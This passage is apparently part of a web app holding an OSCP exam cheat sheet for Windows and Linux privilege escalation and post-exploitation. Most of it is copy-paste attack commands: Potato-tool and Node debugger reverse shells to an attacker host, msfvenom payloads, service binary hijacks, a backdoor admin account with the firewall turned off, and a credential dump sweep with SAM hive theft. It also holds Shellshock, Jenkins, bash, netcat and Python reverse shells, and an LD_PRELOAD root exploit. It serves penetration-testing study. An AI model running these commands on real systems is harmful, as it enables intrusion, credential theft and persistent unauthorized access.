+<div class="tb"><strong>Tip:</strong> Copy-paste this entire block into your shell as soon as you land. Pipe to a file (<code>cmd /c "ipconfig /all & systeminfo & ..." > C:\\temp\\enum.txt</code>) so you can review it while WinPEAS runs.</div>`},
+
+{step:"02",title:"WinPEAS Panic-Reading Order (9 Priorities)",body:`<div class="wb"><strong>Read WinPEAS output in this priority order. Confirm a condition before exploiting.</strong></div>
+<table>
+<tr><th>#</th><th>What to Check</th><th>What It Means</th></tr>
+<tr><td>1</td><td>User, groups, integrity, privileges</td><td>Decide: low user, admin+UAC, or service account</td></tr>
+<tr><td>2</td><td>Passwords, autologon, saved creds, configs</td><td>Fastest path when creds reused for RDP/WinRM/admin</td></tr>
+<tr><td>3</td><td>Services: writable binary/folder, unquoted, weak ACL</td><td>Service runs as SYSTEM &mdash; you can restart</td></tr>
+<tr><td>4</td><td>Scheduled tasks / startup / autoruns</td><td>Privileged task calls writable scripts/binaries</td></tr>
+<tr><td>5</td><td>SeImpersonate / SeAssignPrimaryToken</td><td>Potato family after confirming privilege exists</td></tr>
+<tr><td>6</td><td>AlwaysInstallElevated</td><td>Only if both HKCU and HKLM keys are 1</td></tr>
+<tr><td>7</td><td>RDP / local admin / UAC</td><td>UAC bypass if admin but medium integrity</td></tr>
+<tr><td>8</td><td>Interesting files / backups / logs</td><td>When stuck or WinPEAS highlights creds/backups</td></tr>
+<tr><td>9</td><td>Kernel / patch suggestions</td><td>Last resort. Confirm OS build and exploit reliability</td></tr>
+</table>
+<h4>Run WinPEAS</h4>
+<div class="cb"><span class="ct">winPEASx64.exe</span>
+<span class="cm"># .NET too old?</span>
+<span class="ct">winPEASany.bat</span></div>
+<h4>Windows-exploit-suggester (PowerShell LPE Triage)</h4>
+<div class="cb"><span class="cm"># On target (runs as normal user, no external modules):</span>
+<span class="ct">powershell</span> <span class="cf">-ExecutionPolicy Bypass -File</span> .\\windows-exploit-suggester-standalone.ps1
+
+<span class="cm"># Offline from Kali (capture systeminfo first):</span>
+systeminfo > target-systeminfo.txt
+<span class="ct">pwsh</span> ./windows-exploit-suggester-standalone.ps1 <span class="cf">-SysteminfoFile</span> ./target-systeminfo.txt <span class="cf">-CveOnly</span></div>
+<div class="tb"><strong>Tip:</strong> windows-exploit-suggester checks 115+ CVEs (KiTrap0D through CLFS), AlwaysInstallElevated, unquoted paths, writable services/binaries, writable PATH dirs, UAC state, stored creds, and abusable token privileges. Options: -CveOnly, -MisconfigOnly, -ShowAll.</div>`},
+
+{step:"03",title:"SeImpersonatePrivilege (Potato Attacks)",body:`<div class="cb"><span class="ct">whoami</span> <span class="cf">/priv</span></div>
+<p>If <strong>SeImpersonatePrivilege</strong> or <strong>SeAssignPrimaryTokenPrivilege</strong> is present (even "Disabled"), you can escalate to SYSTEM.</p>
+<span class="tt pe">GodPotato</span> <span class="tt pe">PrintSpoofer</span> <span class="tt pe">JuicyPotato</span> <span class="tt pe">SigmaPotato</span>
+<div class="cb"><span class="cm"># 1. GodPotato (broadest compatibility)</span>
+<span class="ct">GodPotato.exe</span> <span class="cf">-cmd</span> "C:\\temp\\nc.exe &lt;KALI&gt; 443 -e cmd.exe"
+
+<span class="cm"># 2. PrintSpoofer (Win10/Server 2016-2019)</span>
+<span class="ct">PrintSpoofer64.exe</span> <span class="cf">-c</span> "C:\\temp\\nc.exe &lt;KALI&gt; 443 -e cmd.exe"
+
+<span class="cm"># 3. JuicyPotato (Server 2016 and older)</span>
+<span class="ct">JuicyPotato.exe</span> <span class="cf">-l 1337 -p</span> C:\\temp\\nc.exe <span class="cf">-a</span> "&lt;KALI&gt; 443 -e cmd.exe" <span class="cf">-t *</span>
+
+<span class="cm"># 4. SigmaPotato (newer fallback)</span>
+<span class="ct">SigmaPotato.exe</span> "cmd /c C:\\temp\\nc.exe &lt;KALI&gt; 443 -e cmd.exe"</div>
+<h4>FullPowers.exe (Restore Filtered Privileges)</h4>
+<div class="cb"><span class="cm"># If SeImpersonate is filtered/missing on service account:</span>
+<span class="ct">FullPowers.exe</span> <span class="cf">-c</span> "C:\\temp\\nc.exe &lt;KALI&gt; 443 -e cmd.exe"</div>
+<h4>Other Abusable Privileges</h4>
+<table>
+<tr><th>Privilege</th><th>Abuse</th></tr>
+<tr><td>SeBackupPrivilege</td><td><code>robocopy /b C:\\Users\\Administrator\\Desktop C:\\temp</code> or <code>reg save HKLM\\SAM C:\\temp\\SAM</code> + secretsdump</td></tr>
+<tr><td>SeRestorePrivilege</td><td>Overwrite privileged files</td></tr>
+<tr><td>SeDebugPrivilege</td><td>Dump processes / credential access</td></tr>
+<tr><td>SeTakeOwnership</td><td>Take ownership of files/services</td></tr>
+</table>`},
+
+{step:"04",title:"Service Binary Hijack (XAMPP/Apache)",body:`<h4>Find Vulnerable Services</h4>
+<div class="cb"><span class="ct">Get-CimInstance</span> -ClassName win32_service | Select Name,State,PathName
+<span class="cm"># Check permissions on service binary:</span>
+<span class="ct">icacls</span> "C:\\path\\to\\service.exe"
+<span class="cm"># Look for (F)ull or (M)odify for your user/group</span>
+
+<span class="cm"># accesschk (comprehensive service DACL check):</span>
+<span class="ct">accesschk64.exe</span> <span class="cf">-uwcqv</span> "Users" * <span class="cf">-accepteula</span>
+<span class="ct">accesschk64.exe</span> <span class="cf">-uwcqv</span> "Everyone" * <span class="cf">-accepteula</span>
+
+<span class="cm"># SharpUp (finds service misconfigs WinPEAS may miss):</span>
+<span class="ct">SharpUp.exe</span> audit</div>
+<div class="tb"><strong>XAMPP/Apache httpd.exe:</strong> Common OSCP vector. If httpd.exe is writable, replace it with a reverse shell, then restart the service (runs as SYSTEM).</div>
+<div class="cb"><span class="cm"># Replace service binary with reverse shell</span>
+<span class="ct">copy</span> C:\\temp\\shell.exe "C:\\xampp\\apache\\bin\\httpd.exe"
+<span class="ct">sc stop</span> Apache2.4 && <span class="ct">sc start</span> Apache2.4
+
+<span class="cm"># Or: reconfigure service path</span>
+<span class="ct">sc config</span> &lt;service&gt; <span class="cf">binpath=</span>"C:\\temp\\shell.exe" <span class="cf">obj=</span>LocalSystem
+<span class="ct">sc stop</span> &lt;service&gt; && <span class="ct">sc start</span> &lt;service&gt;</div>
+<h4>Unquoted Service Paths</h4>
+<div class="cb"><span class="ct">wmic service get name,pathname</span> | findstr /i /v "C:\\Windows\\\\" | findstr /i /v """"
+<span class="cm"># Path like C:\\Program Files\\My App\\service.exe (unquoted)</span>
+<span class="cm"># Windows tries C:\\Program.exe, then C:\\Program Files\\My.exe, etc.</span>
+<span class="cm"># Place payload at writable point along the path</span></div>
+<h4>Writable PATH Directory Hijack</h4>
+<div class="cb"><span class="cm"># Check which PATH directories are writable:</span>
+<span class="ct">echo %PATH%</span> <span class="cm">&amp; check icacls on each directory</span>
+<span class="cm"># If a service/task calls a binary without full path and a PATH dir is writable,</span>
+<span class="cm"># plant a payload binary with the same name in that directory</span></div>`},
+
+{step:"05",title:"Stored Credentials, History & Registry",body:`<h4>cmdkey / runas /savecred</h4>
+<div class="cb"><span class="ct">cmdkey</span> <span class="cf">/list</span>
+<span class="cm"># If saved creds exist:</span>
+<span class="ct">runas</span> <span class="cf">/savecred /user:</span>&lt;USER&gt; "C:\\temp\\rev.exe"</div>
+<h4>PowerShell History</h4>
+<div class="cb"><span class="ct">type</span> %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</div>
+<h4>Registry Credentials</h4>
+<div class="cb"><span class="ct">reg query</span> "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
+<span class="ct">reg query</span> HKLM /f password /t REG_SZ /s
+<span class="ct">reg query</span> HKCU /f password /t REG_SZ /s</div>
+<h4>AlwaysInstallElevated</h4>
+<div class="cb"><span class="ct">reg query</span> HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
+<span class="ct">reg query</span> HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
+<span class="cm"># Both must be 1. Then:</span>
+<span class="ct">msfvenom</span> -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=443 -f msi -o evil.msi
+<span class="ct">msiexec</span> /quiet /qn /i evil.msi</div>
+<h4>McAfee SiteList.xml Decryption</h4>
+<div class="cb"><span class="cm"># Find McAfee config files</span>
+dir C:\\ /s /b SiteList.xml 2>nul
+dir C:\\ProgramData\\McAfee /s /b *.xml *.db 2>nul
+findstr /i "Password UserName" "C:\\ProgramData\\McAfee\\Common Framework\\SiteList.xml"
+
+<span class="cm"># Decrypt on Kali (needs pycryptodomex)</span>
+python3 mcafee_sitelist_pwd_decrypt.py '&lt;ENCRYPTED_BASE64&gt;'
+
+<span class="cm"># Or PowerShell on target</span>
+Import-Module .\\Get-SiteListPassword.ps1
+Get-SiteListPassword
+
+<span class="cm"># McAfee ma.db SQLite extraction</span>
+sqlite3 ma.db "SELECT AUTHN_DOMAIN,AUTHN_DOMAIN_USR,AUTH_PASSWD FROM EPOServerInfo;"
+<span class="cm"># Decrypt AUTH_PASSWD with same decryptor</span></div>
+<h4>IIS / web.config Credentials</h4>
+<div class="cb"><span class="ct">type</span> C:\\inetpub\\wwwroot\\web.config
+<span class="ct">type</span> C:\\inetpub\\wwwroot\\web.config | findstr /i "password connectionstring"
+dir C:\\inetpub /s /b web.config 2>nul</div>
+<h4>DPAPI Credential Blobs</h4>
+<div class="cb"><span class="ct">Get-ChildItem</span> C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Credentials\\ -Force
+<span class="ct">Get-ChildItem</span> C:\\Users\\*\\AppData\\Local\\Microsoft\\Credentials\\ -Force</div>
+<h4>WiFi Passwords</h4>
+<div class="cb"><span class="ct">netsh wlan show profiles</span>
+<span class="ct">netsh wlan show profile</span> name="&lt;NETWORK&gt;" key=clear</div>`},
+
+{step:"06",title:"DLL Hijack, Scheduled Tasks, UAC Bypass",body:`<h4>DLL Hijacking Triage</h4>
+<div class="cb"><span class="cm"># Identify DLL candidates from Kali</span>
+<span class="ct">strings -e l</span> executable.exe | grep -i '.dll'
+
+<span class="cm"># Generate malicious DLL</span>
+<span class="ct">msfvenom</span> -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=443 -f dll -o hijack.dll</div>
+<h4>Scheduled Task Hijacking</h4>
+<div class="cb"><span class="ct">schtasks</span> /query /fo LIST /v
+<span class="ct">Get-ScheduledTask</span>
+<span class="cm"># Check permissions on task binary:</span>
+<span class="ct">icacls</span> "C:\\path\\to\\task\\binary.exe"</div>
+<h4>RunasCs.exe (Run as Another User)</h4>
+<div class="cb"><span class="cm"># When you have creds for another user:</span>
+<span class="ct">RunasCs.exe</span> &lt;user&gt; '&lt;pass&gt;' "cmd /c C:\\temp\\nc.exe &lt;KALI&gt; 443 -e cmd.exe"</div>
+<h4>UAC Bypass (Admin but Medium Integrity)</h4>
+<div class="cb"><span class="cm"># Check integrity level:</span>
+<span class="ct">whoami</span> /groups | findstr /i "mandatory"
+<span class="cm"># If Medium + in Administrators group: use UACME or fodhelper bypass</span></div>`},
+
+{step:"07",title:"Node.js Debugger Exploitation",body:`<p>Check if a Node.js debugger (port 9229/9230/9231) runs as a privileged user:</p>
+<div class="cb"><span class="ct">netstat</span> -ano | findstr "9229"
+<span class="ct">curl</span> http://127.0.0.1:9229/json</div>
+<p>If it returns JSON with <code>webSocketDebuggerUrl</code>, you can execute code as that user via ChromeDevTools protocol.</p>
+<div class="cb"><span class="cm"># Python WebSocket PoC (root_shell.py)</span>
+<span class="cm"># 1. GET http://127.0.0.1:9229/json -> webSocketDebuggerUrl</span>
+<span class="cm"># 2. Connect via WebSocket</span>
+<span class="cm"># 3. Send Runtime.evaluate with reverse shell:</span>
+{"id":1,"method":"Runtime.evaluate","params":{
+  "expression":"require('child_process').exec('cmd /c C:\\\\temp\\\\nc.exe &lt;KALI&gt; 443 -e cmd.exe')",
+  "includeCommandLineAPI":true}}</div>`},
+
+{step:"08",title:"Automated Enumeration & Proof",body:`<div class="cb"><span class="cm"># PrivescCheck</span>
+<span class="ct">powershell -ep bypass -File</span> .\\PrivescCheck.ps1
+
+<span class="cm"># PowerUp</span>
+<span class="ct">powershell -ep bypass</span>
+Import-Module .\\PowerUp.ps1
+Invoke-AllChecks</div>
+<h4>Create Admin User Payload</h4>
+<div class="cb"><span class="cm"># When you can replace a script executed as admin:</span>
+Set-Content C:\\&lt;path&gt;\\script.ps1 'net user oscp P@ssw0rd123! /add; net localgroup Administrators oscp /add'</div>
+<h4>Proof Capture</h4>
+<div class="cb"><span class="ct">whoami</span> && <span class="ct">hostname</span> && <span class="ct">ipconfig</span>
+<span class="ct">type</span> C:\\Users\\Administrator\\Desktop\\proof.txt
+<span class="cm"># Search if not in expected location:</span>
+dir C:\\Users\\*\\Desktop\\proof.txt /s /b 2>nul
+dir C:\\Users\\*\\Desktop\\local.txt /s /b 2>nul</div>`}
+]},
+
+win_admin:{title:"Windows \u2014 Post-Exploitation",sections:[
+{step:"01",title:"Proof & Persistence",body:`<div class="wb"><strong>Screenshot proof.txt with <code>whoami && hostname && ipconfig</code> visible. The screenshot is required for the report.</strong></div>
+<div class="cb"><span class="ct">whoami</span> && <span class="ct">hostname</span> && <span class="ct">ipconfig</span>
+<span class="ct">type</span> C:\\Users\\Administrator\\Desktop\\proof.txt</div>
+<h4>Create Backup Admin</h4>
+<div class="cb"><span class="ct">net user</span> backdoor Password123! /add
+<span class="ct">net localgroup</span> Administrators backdoor /add
+<span class="ct">net localgroup</span> "Remote Desktop Users" backdoor /add
+<span class="ct">net localgroup</span> "Remote Management Users" backdoor /add
+<span class="ct">netsh advfirewall set allprofiles state off</span></div>`},
+{step:"02",title:"Credential Harvesting",body:`<h4>${T.mk} One-Line Dump Sweep</h4>
+<div class="cb"><span class="ct">${T.mk}.exe</span> "privilege::debug" "token::elevate" "log" "lsadump::sam /patch" "lsadump::sam" "lsadump::secrets" "lsadump::lsa" "lsadump::lsa /patch" "lsadump::cache" "sekurlsa::msv" "sekurlsa::logonpasswords full" "sekurlsa::ekeys" "sekurlsa::dpapi" "sekurlsa::credman" "vault::list" "vault::cred /patch" "exit"</div>
+<div class="tb"><strong>Tip:</strong> Use a pinned stable ${T.mk} build if the latest crashes. Only run after admin/SYSTEM confirmed.</div>
+<h4>NetExec from Kali</h4>
+<div class="cb"><span class="ct">nxc smb</span> $IP <span class="cf">-u Administrator -p '&lt;pass&gt;' --sam</span>
+<span class="ct">nxc smb</span> $IP <span class="cf">-u Administrator -p '&lt;pass&gt;' --lsa</span>
+<span class="ct">nxc smb</span> $IP <span class="cf">-u Administrator -p '&lt;pass&gt;' -M lsassy</span></div>
+<h4>${T.lz} (All Stored Passwords)</h4>
+<div class="cb"><span class="ct">${T.lz}.exe</span> all</div>
+<h4>impacket-secretsdump</h4>
+<div class="cb"><span class="ct">impacket-secretsdump</span> &lt;user&gt;:'&lt;pass&gt;'@$IP</div>
+<h4>SAM/SYSTEM Hive Extraction (Offline Cracking)</h4>
+<div class="cb"><span class="cm"># Method 1: reg save (most common)</span>
+<span class="ct">reg save</span> HKLM\\SAM C:\\temp\\SAM
+<span class="ct">reg save</span> HKLM\\SYSTEM C:\\temp\\SYSTEM
+<span class="cm"># Transfer to Kali, then:</span>
+<span class="ct">impacket-secretsdump</span> -sam SAM -system SYSTEM LOCAL
+
+<span class="cm"># Method 2: Volume Shadow Copy (if reg save fails)</span>
+<span class="ct">wmic shadowcopy call create Volume='C:\\'</span>
+<span class="ct">vssadmin list shadows</span>
+copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM C:\\temp\\SAM
+copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\temp\\SYSTEM</div>`},
+{step:"03",title:"Network Discovery (for Pivoting)",body:`<div class="cb"><span class="ct">ipconfig</span> /all
+<span class="ct">route print</span>
+<span class="ct">arp -a</span>
+<span class="ct">netstat</span> -ano
+<span class="ct">net view</span> /domain</div>
+<p>Look for internal subnets, other hosts, domain controllers. If internal network found, proceed to AD methodology.</p>`}
+]},
+
+linux_noaccess:{title:"Linux \u2014 Initial Access",sections:[
+{step:"01",title:"Workspace Setup & Required Scans",body:`<h4>Set Variables</h4>
+<div class="cb"><span class="ct">export</span> IP=&lt;TARGET_IP&gt;  TARGET=$IP  TIP=$IP
+<span class="ct">export</span> KALI=&lt;YOUR_TUN0_IP&gt;  LHOST=$KALI  KIP=$KALI
+<span class="ct">export</span> LPORT=443
+mkdir -p ~/oscp/$IP/{scans,www,loot,exploits,shells,proofs}
+cd ~/oscp/$IP</div>
+<h4>TCP Full Scan</h4>
+<div class="cb"><span class="ct">sudo nmap</span> <span class="cf">-sVC -p- -v -T4 -sT --open</span> $IP <span class="cf">-oN</span> results</div>
+<h4>UDP Scan</h4>
+<div class="cb"><span class="ct">sudo nmap</span> <span class="cf">-sU -p 1-1024 -v</span> $IP <span class="cf">-oA</span> results_UDP</div>
+<h4>Domain Discovery via SSL Cert</h4>
+<div class="cb"><span class="ct">nmap</span> <span class="cf">-sV -p443 --script ssl-cert</span> $IP</div>`},
+
+{step:"02",title:"Service Enumeration (FTP/SMB/NFS/SNMP/Redis/DB)",body:`<h4>FTP</h4>
+<div class="cb"><span class="ct">ftp</span> $IP <span class="cm">(anonymous / blank)</span>
+<span class="ct">wget -m</span> ftp://anonymous:anonymous@$IP/ -P loot/ftp
+grep -RniE 'pass|pwd|user|login|key|token|secret|credential|backup|db' loot/ftp 2>/dev/null</div>
+<h4>SMB</h4>
+<div class="cb"><span class="ct">smbclient -L</span> //$IP/ -N
+<span class="ct">smbmap -H</span> $IP
+<span class="ct">nxc smb</span> $IP -u '' -p '' --shares
+<span class="ct">enum4linux-ng -A</span> $IP
+<span class="cm"># Recursive download:</span>
+smbclient //$IP/&lt;SHARE&gt; -N -c "recurse ON; prompt OFF; mget *"</div>
+<h4>NFS</h4>
+<div class="cb"><span class="ct">showmount -e</span> $IP
+<span class="ct">sudo mount -t nfs</span> $IP:/&lt;share&gt; /mnt</div>
+<h4>SNMP (Check extend objects for RCE)</h4>
+<div class="cb"><span class="ct">snmpwalk -v2c -c public</span> $IP
+<span class="ct">snmpwalk -v2c -c public</span> $IP NET-SNMP-EXTEND-MIB::nsExtendOutputFull</div>
+<h4>Redis (Unauthenticated SSH Key Write)</h4>
+<div class="cb"><span class="ct">redis-cli -h</span> $IP
+<span class="cm"># If unauth + valid local user with writable home:</span>
+(echo -e "\\n"; cat ~/.ssh/id_rsa.pub; echo -e "\\n") > /tmp/sshkey.txt
+redis-cli -h $IP flushall
+cat /tmp/sshkey.txt | redis-cli -h $IP -x set crackit
+redis-cli -h $IP config set dir /home/&lt;user&gt;/.ssh
+redis-cli -h $IP config set dbfilename authorized_keys
+redis-cli -h $IP save</div>
+<h4>Rsync (Port 873)</h4>
+<div class="cb"><span class="ct">rsync --list-only</span> rsync://$IP/
+<span class="cm"># If shares found:</span>
+<span class="ct">rsync -av</span> rsync://$IP/&lt;share&gt; ./rsync-loot</div>
+<h4>Databases</h4>
+<div class="cb"><span class="ct">mysql -u root -h</span> $IP
+<span class="ct">psql -h</span> $IP <span class="cf">-U postgres</span>
+<span class="ct">impacket-mssqlclient</span> sa@$IP</div>
+<h4>SMTP User Enum</h4>
+<div class="cb"><span class="ct">smtp-user-enum</span> -M VRFY -U /usr/share/wordlists/seclists/Usernames/Names/names.txt -t $IP</div>`},
+
+{step:"03",title:"Web Enumeration Deep",body:`<h4>Feroxbuster Recursive (Depth 4)</h4>
+<div class="cb"><span class="ct">feroxbuster</span> -u http://$IP/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt,bak,old,conf,json,xml,cgi,pl,py -t 50 --depth 4
+
+<span class="cm"># Tip: recurse into /api</span>
+<span class="ct">feroxbuster</span> -u http://$IP/api/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt --depth 4</div>
+<h4>Virtual Hosts</h4>
+<div class="cb"><span class="ct">ffuf</span> -u http://$IP/ -H "Host: FUZZ.&lt;DOMAIN&gt;" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs &lt;default_size&gt;</div>
+<h4>.git Exposure</h4>
+<div class="cb"><span class="ct">git-dumper</span> http://$IP/.git/ ./git-dump
+cd git-dump && git log --oneline && git diff HEAD~5</div>
+<h4>Manual SQLi / LFI / Command Injection</h4>
+<p>Same SQLi techniques as Windows methodology. For Linux LFI, target:</p>
+<div class="cb">/etc/passwd
+/etc/shadow  <span class="cm">(if readable)</span>
+/home/&lt;user&gt;/.ssh/id_rsa
+/proc/self/environ
+/var/www/html/config.php
+<span class="cm"># Traversal bypasses:</span>
+../../../../../../etc/passwd
+....//....//....//etc/passwd
+..%252f..%252fetc/passwd</div>
+<h4>WordPress</h4>
+<div class="cb"><span class="ct">wpscan</span> --url http://$IP/ --enumerate u,p,t --plugins-detection aggressive</div>
+<h4>Tomcat / Jenkins on Linux</h4>
+<div class="cb"><span class="cm"># Tomcat Manager (try default creds: tomcat/tomcat, admin/admin, tomcat/s3cret)</span>
+curl -u tomcat:tomcat http://$IP:8080/manager/html
+<span class="cm"># Deploy WAR shell: msfvenom -p java/shell_reverse_tcp LHOST=$KALI LPORT=443 -f war -o shell.war</span>
+
+<span class="cm"># Jenkins Script Console (/script)</span>
+<span class="cm"># Groovy reverse shell:</span>
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","bash -i >& /dev/tcp/&lt;KALI&gt;/443 0>&1"] as String[])</div>
+<h4>CGI / Shellshock (CVE-2014-6271)</h4>
+<div class="cb"><span class="cm"># Check for /cgi-bin/ scripts (nmap often finds them)</span>
+<span class="ct">nmap</span> -p80 --script http-shellshock --script-args uri=/cgi-bin/status $IP
+<span class="ct">curl</span> -H "User-Agent: () { :;}; /bin/bash -c 'bash -i >& /dev/tcp/&lt;KALI&gt;/443 0>&1'" http://$IP/cgi-bin/&lt;script&gt;</div>`},
+
+{step:"04",title:"Reverse Shells & Stabilization",body:`<h4>Penelope OSCP Safe Listener</h4>
+<div class="cb"><span class="ct">penelope -O -i tun0 -p 4444</span>
+<span class="cm"># Show payloads: penelope -O -i tun0 -p 4444 -a</span></div>
+<h4>Bash Reverse Shell</h4>
+<div class="cb">bash -c 'bash -i >&amp; /dev/tcp/&lt;KALI&gt;/443 0>&amp;1'
+<span class="cm"># URL-encoded version:</span>
+bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F&lt;KALI&gt;%2F443%200%3E%261%22</div>
+<h4>Netcat / BusyBox</h4>
+<div class="cb">nc -e /bin/bash &lt;KALI&gt; 443
+<span class="cm"># If nc missing -e:</span>
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&amp;1|nc &lt;KALI&gt; 443 >/tmp/f
+<span class="cm"># BusyBox:</span>
+busybox nc &lt;KALI&gt; 443 -e /bin/bash</div>
+<h4>Python</h4>
+<div class="cb">python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("&lt;KALI&gt;",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'</div>
+<h4>msfvenom (non-Meterpreter)</h4>
+<div class="cb"><span class="ct">msfvenom -p</span> linux/x64/shell_reverse_tcp LHOST=$KALI LPORT=443 -f elf -o shell.elf</div>
+<h4>Shell Stabilization</h4>
+<div class="cb"><span class="cm"># Python PTY (try first)</span>
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
+stty rows 40 columns 120
+
+<span class="cm"># If Python missing:</span>
+script -qc /bin/bash /dev/null
+export TERM=xterm
+
+<span class="cm"># Full stabilization: Ctrl+Z, then on Kali:</span>
+stty raw -echo; fg
+reset
+export TERM=xterm</div>
+<h4>Restricted Shell Escape</h4>
+<div class="cb"><span class="cm"># Method: ed -> /bin/bash</span>
+ed
+!/bin/bash
+export PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin</div>
+<h4>File Transfer to Linux Target</h4>
+<div class="cb"><span class="cm"># Kali:</span>
+python3 -m http.server 8000
+
+<span class="cm"># Target:</span>
+wget http://&lt;KALI&gt;:8000/&lt;FILE&gt;
+curl http://&lt;KALI&gt;:8000/&lt;FILE&gt; -o &lt;FILE&gt;
+busybox wget http://&lt;KALI&gt;:8000/&lt;FILE&gt;</div>`}
+]},
+
+linux_lowpriv:{title:"Linux \u2014 Privilege Escalation",sections:[
+{step:"01",title:"LinPEAS Panic-Reading Order (12 Priorities)",body:`<div class="wb"><strong>Read LinPEAS in this priority order. Mark each as YES / NO / NEEDS CHECK.</strong></div>
+<table>
+<tr><th>#</th><th>What to Check</th><th>Copy-Paste</th></tr>
+<tr><td>1</td><td>sudo -l and sudo version</td><td><code>sudo -l</code></td></tr>
+<tr><td>2</td><td>Writable PATH / path abuse</td><td><code>echo $PATH; find / -writable -type d 2>/dev/null</code></td></tr>
+<tr><td>3</td><td>Cron, timers, running processes</td><td><code>cat /etc/crontab; systemctl list-timers; ./pspy64</code></td></tr>
+<tr><td>4</td><td>Active local ports</td><td><code>ss -tulpn; netstat -tulpn 2>/dev/null</code></td></tr>
+<tr><td>5</td><td>SUID / SGID files</td><td><code>find / -perm -4000 -type f 2>/dev/null</code></td></tr>
+<tr><td>6</td><td>Capabilities</td><td><code>getcap -r / 2>/dev/null</code></td></tr>
+<tr><td>7</td><td>Interesting software</td><td><code>which python3 perl ruby find vim tar bash</code></td></tr>
+<tr><td>8</td><td>Backup/config/history/log files</td><td><code>grep -RniE 'pass|password|secret|token' /home /opt /var 2>/dev/null</code></td></tr>
+<tr><td>9</td><td>SSH keys/config</td><td><code>find /home /root -name id_rsa -o -name authorized_keys 2>/dev/null</code></td></tr>
+<tr><td>10</td><td>Unusual passwd/shadow copies</td><td><code>find / -iname '*passwd*' -o -iname '*shadow*' 2>/dev/null</code></td></tr>
+<tr><td>11</td><td>Polkit/kernel suggestions</td><td><code>pkexec --version; uname -a</code></td></tr>
+<tr><td>12</td><td>Logged-in users / login history</td><td><code>w; last; lastlog</code></td></tr>
+</table>
+<h4>First Commands After Landing (Run Immediately)</h4>
+<div class="cb">id && uname -a
+ip addr && ip route
+cat /etc/os-release
+sudo -l
+find / -perm -4000 -type f 2>/dev/null | head -20
+cat /etc/crontab
+ss -tulpn
+ps aux
+cat /etc/passwd
+ls -la /home/
+env</div>
+<h4>Run LinPEAS</h4>
+<div class="cb"><span class="ct">./linpeas.sh</span> | tee /tmp/linpeas.out
+grep -iE "password|passwd|cred|secret|sudo|suid|capab|cron|writable" /tmp/linpeas.out | head -200</div>`},
+
+{step:"02",title:"sudo -l & GTFOBins",body:`<div class="cb"><span class="ct">sudo -l</span></div>
+<p>Check every binary against <a href="https://github.com/GTFOBins/GTFOBins.github.io" target="_blank">GTFOBins (GitHub)</a>.</p>
+<ul>
+<li><code>(ALL) NOPASSWD: ALL</code> &rarr; <code>sudo -i</code> for instant root</li>
+<li>Specific binary &rarr; look up its GTFOBins sudo entry</li>
+<li><code>env_keep+=LD_PRELOAD</code> &rarr; see LD_PRELOAD exploit below</li>
+<li>Check sudo version: CVE-2021-3156 (Baron Samedit), CVE-2019-14287 (<code>sudo -u#-1</code>)</li>
+</ul>
+<h4>Common SUID / sudo GTFOBins</h4>
+<div class="cb"><span class="cm"># find with SUID</span>
+find . -exec /bin/sh -p \\; -quit
+
+<span class="cm"># mawk with SUID</span>
+/usr/bin/mawk 'BEGIN {system("/bin/sh -p")}'
+
+<span class="cm"># cpulimit with SUID</span>
+/usr/bin/cpulimit -l 100 -f -- /bin/sh -p
+
+<span class="cm"># bash with SUID</span>
+bash -p
+
+<span class="cm"># vim</span>
+vim -c ':!/bin/sh'
+
+<span class="cm"># python3</span>
+python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'</div>
+<h4>LD_PRELOAD Exploit (if env_keep+=LD_PRELOAD in sudo -l)</h4>
+<div class="cb"><span class="cm"># Create /tmp/evil.c:</span>
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+void _init() { unsetenv("LD_PRELOAD"); setuid(0); system("/bin/bash -p"); }
+
+<span class="cm"># Compile and exploit:</span>
+gcc -fPIC -shared -nostartfiles -o /tmp/evil.so /tmp/evil.c
+sudo LD_PRELOAD=/tmp/evil.so &lt;allowed_command&gt;</div>`},
+
+{step:"03",title:"SUID/SGID & Capabilities",body:`<h4>SUID Binaries</h4>
+<div class="cb"><span class="ct">find / -perm -u=s -type f</span> 2>/dev/null
+<span class="cm"># Filter standard system binaries:</span>
+find / -perm -4000 2>/dev/null | grep -v '/usr/bin\\|/usr/lib\\|/bin'</div>
+<h4>SUID + PATH Hijack</h4>
+<p>If a SUID binary calls a command without full path (e.g., <code>cp</code>, <code>cat</code>, <code>date</code>):</p>
+<div class="cb"><span class="cm"># Create fake binary in writable dir</span>
+echo '#!/bin/bash' > /tmp/&lt;command&gt;
+echo '/bin/bash -p' >> /tmp/&lt;command&gt;
+chmod +x /tmp/&lt;command&gt;
+export PATH=/tmp:$PATH
+<span class="cm"># Run the SUID binary &mdash; calls your fake command as root</span></div>
+<h4>Capabilities</h4>
+<div class="cb"><span class="ct">getcap -r /</span> 2>/dev/null</div>
+<p><code>cap_setuid+ep</code> on interpreters (python3, perl, ruby) = instant root via <code>setuid(0)</code> + spawn shell.</p>`},
+
+{step:"04",title:"Cron Jobs, pspy & Wildcard Attacks",body:`<div class="cb"><span class="ct">crontab -l</span>
+<span class="ct">cat /etc/crontab</span>
+<span class="ct">ls -lah /etc/cron*</span>
